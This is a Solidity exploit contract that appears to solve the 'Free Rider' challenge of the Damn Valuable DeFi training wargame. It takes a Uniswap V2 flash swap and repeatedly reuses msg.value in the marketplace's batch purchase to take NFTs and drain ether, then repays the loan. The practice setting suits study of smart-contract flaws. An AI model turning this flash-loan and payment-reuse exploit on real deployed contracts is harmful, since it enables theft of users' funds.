// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface WETH {
    function deposit() external payable;

    function withdraw(uint256) external;

    function transfer(address, uint256) external returns (bool);
}

contract Attacker10 is IERC721Receiver {
    address private buyerAddr;
    bool private isComplete;
    DamnValuableNFT private nft;
    FreeRiderNFTMarketplace private market;

    constructor(
        address _buyerAddr,
        address _nftTokenAddr,
        address _marketAddr
    ) payable {
        buyerAddr = _buyerAddr;
        nft = DamnValuableNFT(_nftTokenAddr);
        market = FreeRiderNFTMarketplace(payable(_marketAddr));
    }

    receive() external payable {}

    function attack(address _swapAddr) public {
        IUniswapV2Pair pair = IUniswapV2Pair(_swapAddr);
        bytes memory data = abi.encode(pair.token0());
        pair.swap(15 ether, 0, address(this), data);
    }

    // don't use this code in production, will get hacked
    function uniswapV2Call(
        address,
        uint256 _amount0,
        uint256,
        bytes calldata _data
    ) public {
        address token0Addr = abi.decode(_data, (address));

        WETH weth = WETH(token0Addr);
        // WETH to ETH
        weth.withdraw(_amount0);

        buyNFTs();
        trickMarketPlace();
        transferNFTsToBuyer();

        // add fee
        uint256 amountToPay = _amount0 + (_amount0 * 3) / 997 + 1;

        // ETH to WETH
        weth.deposit{value: amountToPay}();
        weth.transfer(msg.sender, amountToPay);
    }

    function buyNFTs() private {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        market.buyMany{value: 15 ether}(tokenIds);
    }

    function trickMarketPlace() private {
        uint256[] memory tokenIds = new uint256[](2);
        uint256[] memory prices = new uint256[](2);
        prices[0] = prices[1] = 15 ether;
        market.offerMany(tokenIds, prices);

        market.buyMany{value: 15 ether}(tokenIds);
    }

    function transferNFTsToBuyer() private {
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyerAddr, i);
        }
    }

    // don't use this code in production, will get hacked
    function onERC721Received(
        address _operator,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        nft.approve(_operator, _tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
